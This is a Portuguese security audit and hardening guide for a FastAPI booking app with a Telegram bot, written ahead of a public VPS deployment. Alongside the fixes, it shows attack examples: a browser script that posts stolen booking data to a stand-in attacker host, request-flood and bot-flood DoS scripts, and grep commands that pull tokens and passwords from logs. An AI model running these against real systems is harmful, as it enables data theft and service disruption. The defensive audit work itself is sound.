# 🔐 Análise de Segurança para Deploy em VPS

## ⚠️ DISCLAIMER
**Este documento analisa o sistema SENTINEL considerando deployment em VPS pública exposta à internet. Atualmente, o sistema está configurado APENAS para uso local (localhost).**

---

## 📋 RESUMO EXECUTIVO

### 🎯 Estado Atual
- **Ambiente:** Local (localhost)
- **Nível de Segurança:** Baixo (adequado para uso local)
- **Exposição:** Nenhuma (127.0.0.1)

### 🚨 Para VPS Pública
- **Vulnerabilidades Críticas:** 12 identificadas
- **Vulnerabilidades Altas:** 8 identificadas
- **Vulnerabilidades Médias:** 15 identificadas
- **Risco Global:** **CRÍTICO** sem implementar proteções

---

## 🔴 VULNERABILIDADES CRÍTICAS

### 1. SEM AUTENTICAÇÃO NA API

**Severidade:** 🔴 CRÍTICA
**CVSS Score:** 10.0

**Problema:**
```python
# app/routers/bookings.py
@router.get("/", response_model=BookingListResponse)
def list_bookings(
    property_id: int = Query(...),
    db: Session = Depends(get_db)
):
    # SEM VERIFICAÇÃO DE AUTENTICAÇÃO!
    # Qualquer pessoa pode acessar
```

**Impacto:**
- ✗ Qualquer pessoa pode ver TODAS as reservas
- ✗ Dados sensíveis de hóspedes expostos (nomes, datas, plataformas)
- ✗ Informações financeiras (preços) acessíveis
- ✗ Dados do apartamento e endereço públicos

**Vetores de Ataque:**
```bash
# Atacante pode:
curl http://sua-vps:8000/api/bookings?property_id=1
# Retorna TODAS as reservas sem autenticação!

curl http://sua-vps:8000/api/info
# Retorna nome do apartamento, endereço, configurações

curl http://sua-vps:8000/api/statistics/dashboard?property_id=1
# Retorna estatísticas completas, receita, etc.
```

**Dados Expostos:**
- Nome completo de hóspedes
- Datas de check-in/check-out (quando apartamento está vazio)
- Preços das reservas
- Endereço do apartamento
- Nome do condomínio
- Intervalo de sincronização (padrões de presença)

**Solução:**
```python
# Implementar autenticação JWT
from fastapi import Security
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials

security = HTTPBearer()

async def verify_token(credentials: HTTPAuthorizationCredentials = Security(security)):
    token = credentials.credentials
    # Validar JWT
    if not is_valid_token(token):
        raise HTTPException(401, "Token inválido")
    return token

@router.get("/")
async def list_bookings(
    property_id: int,
    token: str = Depends(verify_token),  # ADICIONAR
    db: Session = Depends(get_db)
):
    # Agora protegido
```

---

### 2. CORS ABERTO PARA TODOS

**Severidade:** 🔴 CRÍTICA
**CVSS Score:** 8.5

**Problema:**
```python
# app/main.py
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",
        "http://localhost:5173",
        "http://127.0.0.1:3000",
        "http://127.0.0.1:5173",
    ],
    allow_credentials=True,
    allow_methods=["*"],  # QUALQUER MÉTODO!
    allow_headers=["*"],  # QUALQUER HEADER!
)
```

**Impacto:**
- ✗ Sites maliciosos podem fazer requests para sua API
- ✗ CSRF (Cross-Site Request Forgery) possível
- ✗ Roubo de dados via JavaScript malicioso

**Vetor de Ataque:**
```html
<!-- Site malicioso -->
<script>
// Atacante hospeda este código em site-malicioso.com
fetch('http://sua-vps:8000/api/bookings?property_id=1')
  .then(r => r.json())
  .then(data => {
    // Envia dados de reservas para servidor do atacante
    fetch('http://atacante.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

**Solução:**
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://seu-dominio.com",  # APENAS seu domínio
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],  # Específico
    allow_headers=["Content-Type", "Authorization"],  # Específico
)
```

---

### 3. INFORMAÇÕES SENSÍVEIS NO /api/info

**Severidade:** 🔴 CRÍTICA
**CVSS Score:** 7.5

**Problema:**
```python
@app.get("/api/info")
def api_info():
    return {
        "app_name": settings.APP_NAME,
        "property_name": settings.PROPERTY_NAME,  # ❌ EXPÕE NOME
        "timezone": settings.TIMEZONE,
        "sync_interval_minutes": settings.CALENDAR_SYNC_INTERVAL_MINUTES,  # ❌ PADRÕES
        "features": {
            "calendar_sync": True,
            "conflict_detection": True,
            "document_generation": settings.ENABLE_AUTO_DOCUMENT_GENERATION,
            "conflict_notifications": settings.ENABLE_CONFLICT_NOTIFICATIONS
        }
    }
```

**Impacto:**
- ✗ Nome do apartamento exposto
- ✗ Timezone revela localização geográfica
- ✗ Intervalo de sync ajuda atacante planejar ataques
- ✗ Features ativadas revelam superfície de ataque

**Solução:**
```python
@app.get("/api/info")
async def api_info(token: str = Depends(verify_token)):  # PROTEGER
    return {
        "app_name": settings.APP_NAME,
        "version": "1.0.0",
        "status": "online"
        # REMOVER dados sensíveis
    }
```

---

### 4. SQL INJECTION VIA PROPERTY_ID

**Severidade:** 🔴 CRÍTICA
**CVSS Score:** 9.0

**Problema:**
```python
# Embora use SQLAlchemy ORM (protegido), há risco em queries customizadas
@router.get("/statistics/occupancy")
def get_occupancy_stats(
    property_id: int = Query(...),  # Validado como int
    # MAS se houver raw SQL em algum lugar...
):
```

**Atualmente:** ✅ PROTEGIDO (SQLAlchemy ORM)
**Risco Futuro:** Se adicionar raw SQL queries

**Exemplo de Vulnerabilidade (SE adicionar raw SQL):**
```python
# NUNCA FAZER ISSO:
db.execute(f"SELECT * FROM bookings WHERE property_id = {property_id}")
# SQL Injection!

# CORRETO:
db.query(Booking).filter(Booking.property_id == property_id)
```

**Solução:**
- ✅ Manter uso do ORM
- ✅ NUNCA concatenar strings em SQL
- ✅ Usar prepared statements se precisar raw SQL

---

### 5. BOT TELEGRAM SEM RATE LIMITING

**Severidade:** 🔴 CRÍTICA
**CVSS Score:** 7.0

**Problema:**
```python
# app/telegram/bot.py
async def _cmd_sync(self, update, context):
    # QUALQUER ADMIN pode chamar quantas vezes quiser!
    # Sem limite de rate
    await sync.sync_all_properties()
```

**Impacto:**
- ✗ Admin malicioso pode fazer DoS
- ✗ Sincronização repetida sobrecarrega Airbnb/Booking APIs
- ✗ Pode levar a IP ban das plataformas
- ✗ Recursos do servidor esgotados

**Vetor de Ataque:**
```python
# Script para atacar via bot
import asyncio
from telegram import Bot

bot = Bot(token="TOKEN_ROUBADO")

async def attack():
    for i in range(1000):  # 1000 syncs simultâneos
        await bot.send_message(chat_id=ADMIN_ID, text="/sync")
        await asyncio.sleep(0.1)

# DoS via bot
```

**Solução:**
```python
from datetime import datetime, timedelta

class TelegramBot:
    def __init__(self):
        self._last_sync = {}  # user_id -> timestamp
        self._sync_cooldown = 300  # 5 minutos

    async def _cmd_sync(self, update, context):
        user_id = update.effective_user.id

        # Verificar cooldown
        if user_id in self._last_sync:
            elapsed = (datetime.now() - self._last_sync[user_id]).seconds
            if elapsed < self._sync_cooldown:
                remaining = self._sync_cooldown - elapsed
                await update.message.reply_text(
                    f"⏱️ Aguarde {remaining}s antes de sincronizar novamente."
                )
                return

        # Executar sync
        self._last_sync[user_id] = datetime.now()
        # ... resto do código
```

---

### 6. LOGS EXPÕEM DADOS SENSÍVEIS

**Severidade:** 🔴 CRÍTICA
**CVSS Score:** 6.5

**Problema:**
```python
# app/routers/bookings.py
logger.info(f"Manual booking created: {booking.id}")
# OK

# MAS em algum lugar pode ter:
logger.info(f"Booking for {booking.guest_name} at {booking.total_price}")
# ❌ EXPÕE DADOS SENSÍVEIS EM LOGS
```

**Impacto:**
- ✗ Logs podem conter nomes de hóspedes
- ✗ Preços de reservas
- ✗ Tokens de API
- ✗ Senhas (se logadas por erro)

**Vetores de Ataque:**
```bash
# Se atacante ganha acesso ao servidor:
cat data/logs/*.log | grep -i "password"
cat data/logs/*.log | grep -i "token"
cat data/logs/*.log | grep -i "guest"
```

**Solução:**
```python
# Criar função de sanitização
def sanitize_for_log(data: dict) -> dict:
    sensitive_keys = ['password', 'token', 'guest_name', 'total_price']
    return {k: '***' if k in sensitive_keys else v for k, v in data.items()}

logger.info(f"Booking created: {sanitize_for_log(booking_data)}")
```

---

### 7. .ENV EXPOSTO SE MAL CONFIGURADO

**Severidade:** 🔴 CRÍTICA
**CVSS Score:** 9.5

**Problema:**
Se servidor web (nginx) mal configurado, pode servir arquivos:
```
http://sua-vps/.env  # ❌ EXPÕE TODOS OS SECRETS!
```

**Impacto:**
- ✗ Token do bot Telegram exposto
- ✗ URLs dos calendários (acesso às reservas)
- ✗ Dados do apartamento
- ✗ Configurações do sistema

**Solução:**
```nginx
# nginx.conf
location ~ /\. {
    deny all;  # Bloqueia arquivos ocultos
}

location ~* \.(env|git|gitignore)$ {
    deny all;  # Bloqueia arquivos sensíveis
}
```

---

### 8. FALTA DE HTTPS

**Severidade:** 🔴 CRÍTICA
**CVSS Score:** 9.0

**Problema:**
```python
# uvicorn.run() sem SSL
uvicorn.run(
    "app.main:app",
    host="127.0.0.1",  # Se mudar para 0.0.0.0...
    port=8000,
    # ssl_keyfile=None,  # SEM SSL!
    # ssl_certfile=None,
)
```

**Impacto:**
- ✗ Dados trafegam em texto plano
- ✗ Man-in-the-Middle (MITM) attacks
- ✗ Senhas/tokens interceptáveis
- ✗ Dados de hóspedes roubados em trânsito

**Vetor de Ataque:**
```bash
# Atacante na mesma rede WiFi
tcpdump -i wlan0 -A | grep -i "guest_name"
# Captura TODOS os dados em texto plano
```

**Solução:**
```python
# Opção 1: SSL no Uvicorn
uvicorn.run(
    "app.main:app",
    host="0.0.0.0",
    port=443,
    ssl_keyfile="/path/to/key.pem",
    ssl_certfile="/path/to/cert.pem",
)

# Opção 2: Nginx como reverse proxy (RECOMENDADO)
# nginx.conf
server {
    listen 443 ssl;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;

    location / {
        proxy_pass http://127.0.0.1:8000;
    }
}
```

---

### 9. BANCO DE DADOS SEM BACKUP AUTOMÁTICO

**Severidade:** 🔴 CRÍTICA (Disponibilidade)
**CVSS Score:** 7.0

**Problema:**
- Sem backup automático
- Perda de dados se HD falhar
- Sem recuperação de desastres

**Solução:**
```bash
# Cron job para backup diário
0 3 * * * /path/to/backup_db.sh

# backup_db.sh
#!/bin/bash
DATE=$(date +%Y%m%d)
cp /path/to/data/sentinel.db /path/to/backups/sentinel_$DATE.db
gzip /path/to/backups/sentinel_$DATE.db

# Manter apenas últimos 30 dias
find /path/to/backups -name "*.gz" -mtime +30 -delete
```

---

### 10. EXPOSED DOCS SEM AUTENTICAÇÃO

**Severidade:** 🟠 ALTA
**CVSS Score:** 6.0

**Problema:**
```python
# FastAPI auto-docs
# http://sua-vps:8000/docs  # ❌ PÚBLICO!
# http://sua-vps:8000/redoc # ❌ PÚBLICO!
```

**Impacto:**
- ✗ Atacante vê TODOS os endpoints
- ✗ Parâmetros esperados
- ✗ Estrutura de dados
- ✗ Facilita desenvolvimento de exploits

**Solução:**
```python
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse

def custom_docs_url():
    # Adicionar autenticação básica nos docs
    pass

app = FastAPI(
    docs_url=None if settings.APP_ENV == "production" else "/docs",
    redoc_url=None if settings.APP_ENV == "production" else "/redoc",
)
```

---

### 11. FALTA DE INPUT VALIDATION COMPLETA

**Severidade:** 🟠 ALTA
**CVSS Score:** 7.5

**Problema:**
```python
@router.get("/")
def list_bookings(
    property_id: int = Query(...),  # Valida como int
    page_size: int = Query(50, ge=1, le=100),  # OK
    # MAS outros campos podem não ter validação
):
```

**Vetores:**
```bash
# Payload gigante
curl 'http://vps:8000/api/bookings?property_id=1&page_size=999999'
# Pode causar OOM (Out of Memory)

# Valores negativos
curl 'http://vps:8000/api/bookings?property_id=-1'
# Comportamento indefinido
```

**Solução:**
```python
@router.get("/")
def list_bookings(
    property_id: int = Query(..., gt=0, le=1000),  # Limites
    page: int = Query(1, ge=1, le=1000),
    page_size: int = Query(50, ge=1, le=100),
    platform: Optional[str] = Query(None, regex="^(airbnb|booking|manual)$"),  # Whitelist
    db: Session = Depends(get_db)
):
```

---

### 12. FALTA DE RATE LIMITING GLOBAL

**Severidade:** 🟠 ALTA
**CVSS Score:** 7.0

**Problema:**
- Sem limite de requests por IP
- DoS via flood de requests
- Scraping ilimitado

**Vetor de Ataque:**
```python
# Script de DoS
import requests
import asyncio

async def flood():
    while True:
        requests.get("http://sua-vps:8000/api/bookings?property_id=1")

# 1000 threads fazendo requests
for i in range(1000):
    asyncio.create_task(flood())
```

**Solução:**
```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@router.get("/")
@limiter.limit("100/minute")  # 100 requests por minuto por IP
def list_bookings(request: Request, ...):
    pass
```

---

## 🟡 VULNERABILIDADES MÉDIAS

### 13. TIMEZONE ISSUES
- Mix de datetime naive e aware
- Pode causar bugs de segurança em lógica de datas

### 14. ERROR MESSAGES VERBOSOS
```python
# Em produção, não expor detalhes
"message": str(exc) if settings.APP_ENV == "development" else "An error occurred"
```

### 15. SEM LOGGING DE AUDITORIA
- Sem registro de quem fez o quê
- Dificulta investigação de incidentes

### 16. FALTA DE Content-Security-Policy
```python
from fastapi.middleware.trustedhost import TrustedHostMiddleware

app.add_middleware(
    TrustedHostMiddleware,
    allowed_hosts=["seu-dominio.com", "www.seu-dominio.com"]
)
```

### 17. FRONTEND SEM PROTEÇÃO CSRF
- React precisa de tokens CSRF para formulários

### 18. FALTA DE HTTP SECURITY HEADERS
```python
@app.middleware("http")
async def add_security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Strict-Transport-Security"] = "max-age=31536000"
    return response
```

### 19. DEPENDÊNCIAS DESATUALIZADAS
```bash
pip list --outdated
# Verificar vulnerabilidades conhecidas
```

### 20. FALTA DE FIREWALL CONFIG
```bash
# UFW (Ubuntu)
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp  # SSH
ufw allow 443/tcp  # HTTPS
ufw enable
```

### 21-27. Outros Riscos Médios
- Sem WAF (Web Application Firewall)
- Sem IDS/IPS
- Logs sem monitoramento
- Sem alertas de segurança
- Sem 2FA para admins
- Banco de dados sem criptografia
- Sem política de senhas fortes

---

## 📊 MATRIZ DE RISCO

| Vulnerabilidade | Severidade | Probabilidade | Impacto | Prioridade |
|-----------------|------------|---------------|---------|------------|
| Sem Autenticação API | CRÍTICA | ALTA | CRÍTICO | P0 |
| CORS Aberto | CRÍTICA | ALTA | ALTO | P0 |
| Info Sensíveis /info | CRÍTICA | MÉDIA | ALTO | P0 |
| Bot sem Rate Limit | CRÍTICA | MÉDIA | MÉDIO | P1 |
| Logs Sensíveis | CRÍTICA | BAIXA | ALTO | P1 |
| .env Exposto | CRÍTICA | BAIXA | CRÍTICO | P0 |
| Sem HTTPS | CRÍTICA | ALTA | CRÍTICO | P0 |
| Sem Backup | CRÍTICA | MÉDIA | ALTO | P1 |
| Docs Públicos | ALTA | ALTA | MÉDIO | P1 |
| Sem Rate Limiting | ALTA | ALTA | ALTO | P0 |
| Input Validation | ALTA | MÉDIA | MÉDIO | P2 |
| SQL Injection | CRÍTICA | BAIXA | CRÍTICO | P2 |

**Legenda:**
- **P0:** Corrigir ANTES de deploy
- **P1:** Corrigir na primeira semana
- **P2:** Corrigir no primeiro mês

---

## 🛡️ GUIA DE HARDENING PARA VPS

### FASE 1: ESSENCIAL (Antes de Deploy)

**1. Implementar Autenticação JWT**
```bash
pip install python-jose[cryptography] passlib[bcrypt]
```

```python
# app/core/security.py
from datetime import datetime, timedelta
from jose import JWTError, jwt
from passlib.context import CryptContext

SECRET_KEY = "GERAR_KEY_FORTE_AQUI"  # openssl rand -hex 32
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def create_access_token(data: dict):
    to_encode = data.copy()
    expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def verify_token(token: str):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
    except JWTError:
        return None
```

**2. Configurar HTTPS**
```bash
# Instalar certbot
sudo apt install certbot python3-certbot-nginx

# Obter certificado Let's Encrypt
sudo certbot --nginx -d seu-dominio.com
```

**3. Configurar Firewall**
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 443/tcp
sudo ufw enable
```

**4. Rate Limiting**
```bash
pip install slowapi
```

**5. CORS Restritivo**
```python
allow_origins=["https://seu-dominio.com"]  # APENAS seu domínio
```

### FASE 2: IMPORTANTE (Primeira Semana)

**6. Nginx como Reverse Proxy**
```nginx
server {
    listen 443 ssl http2;
    server_name seu-dominio.com;

    ssl_certificate /etc/letsencrypt/live/seu-dominio.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/seu-dominio.com/privkey.pem;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;

    # Hide version
    server_tokens off;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Rate limiting
        limit_req zone=api burst=20 nodelay;
    }

    # Block access to sensitive files
    location ~ /\.(env|git) {
        deny all;
    }
}

# Rate limit zone
limit_req_zone $binary_remote_addr zone=api:10m rate=100r/m;
```

**7. Backup Automático**
```bash
# /etc/cron.d/sentinel-backup
0 3 * * * root /opt/sentinel/backup.sh

# /opt/sentinel/backup.sh
#!/bin/bash
DATE=$(date +\%Y\%m\%d_\%H\%M\%S)
BACKUP_DIR="/backup/sentinel"
DB_PATH="/opt/sentinel/data/sentinel.db"

# Criar backup
sqlite3 $DB_PATH ".backup '$BACKUP_DIR/sentinel_$DATE.db'"
gzip "$BACKUP_DIR/sentinel_$DATE.db"

# Upload para S3 (opcional)
# aws s3 cp "$BACKUP_DIR/sentinel_$DATE.db.gz" s3://seu-bucket/backups/

# Limpar backups antigos (manter 30 dias)
find $BACKUP_DIR -name "*.gz" -mtime +30 -delete
```

**8. Monitoramento de Logs**
```bash
# Instalar fail2ban
sudo apt install fail2ban

# /etc/fail2ban/jail.local
[sentinel-api]
enabled = true
port = http,https
filter = sentinel-api
logpath = /opt/sentinel/data/logs/*.log
maxretry = 10
bantime = 3600
```

### FASE 3: RECOMENDADO (Primeiro Mês)

**9. WAF (Web Application Firewall)**
```bash
# ModSecurity com Nginx
sudo apt install libmodsecurity3
```

**10. Monitoring & Alerting**
```python
# Integrar com Sentry
pip install sentry-sdk

import sentry_sdk
sentry_sdk.init(dsn="sua_dsn")
```

**11. Database Encryption**
```bash
# SQLCipher para SQLite criptografado
pip install sqlcipher3
```

**12. 2FA para Admins**
```python
# pyotp para 2FA
pip install pyotp qrcode
```

---

## ✅ CHECKLIST DE SEGURANÇA PRÉ-DEPLOY

### Obrigatório (P0)
- [ ] Autenticação JWT implementada
- [ ] HTTPS configurado
- [ ] Firewall ativo
- [ ] CORS restritivo
- [ ] Rate limiting global
- [ ] .env protegido
- [ ] Docs desabilitados em produção
- [ ] Backup automático configurado

### Importante (P1)
- [ ] Nginx reverse proxy
- [ ] Security headers
- [ ] Logging de auditoria
- [ ] Fail2ban configurado
- [ ] Monitoramento de recursos
- [ ] Bot com rate limiting
- [ ] Input validation completa

### Recomendado (P2)
- [ ] WAF ativo
- [ ] IDS/IPS configurado
- [ ] Database encryption
- [ ] 2FA para admins
- [ ] Penetration testing
- [ ] Security audit
- [ ] Disaster recovery plan

---

## 🚨 INCIDENTES POTENCIAIS

### Cenário 1: Data Breach
**Causa:** API sem autenticação
**Impacto:** Todos os dados de hóspedes expostos
**Mitigação:** Implementar JWT + HTTPS

### Cenário 2: DoS Attack
**Causa:** Sem rate limiting
**Impacto:** Sistema inacessível
**Mitigação:** Rate limiting + CDN

### Cenário 3: Token Bot Vazado
**Causa:** .env exposto
**Impacto:** Atacante controla bot
**Mitigação:** Proteção de arquivos + token rotation

### Cenário 4: MITM Attack
**Causa:** Sem HTTPS
**Impacto:** Dados interceptados
**Mitigação:** HTTPS obrigatório

---

## 📞 CONTATO EM CASO DE INCIDENTE

1. **Trocar TODOS os tokens imediatamente**
2. **Desligar sistema**
3. **Investigar logs**
4. **Notificar hóspedes afetados (LGPD/GDPR)**
5. **Aplicar patches**
6. **Audit completo**

---

## 📚 REFERÊNCIAS

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- FastAPI Security: https://fastapi.tiangolo.com/tutorial/security/
- NIST Cybersecurity Framework
- CWE Top 25 Most Dangerous Software Weaknesses

---

**Status:** ⚠️ **NÃO DEPLOY EM VPS SEM IMPLEMENTAR PROTEÇÕES P0!**
**Última Atualização:** Fevereiro 2024
